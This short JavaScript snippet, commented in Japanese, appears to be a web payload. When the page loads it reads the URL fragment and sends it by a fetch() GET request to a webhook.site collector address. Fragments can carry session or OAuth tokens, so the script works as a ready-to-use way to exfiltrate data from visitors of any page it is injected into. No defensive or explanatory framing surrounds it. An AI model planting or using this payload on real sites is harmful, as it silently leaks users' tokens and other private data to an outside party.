window.addEventListener('load', function() {
    // 現在のURLのハッシュ部分を取得
    var hash = window.location.hash;

    if (hash) {
        // ハッシュ部分をクエリパラメータとしてエンコード
        var hashParam = encodeURIComponent(hash.substring(1)); // #を除去してエンコード

        // 特定のURLにGETリクエストを送信
        var url = 'https://webhook.site/04c61da2-9ab0-4303-9f8c-58dedf0ef2fc?hash=' + hashParam;

        // GETリクエストを送信
        fetch(url)
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));
    }
});

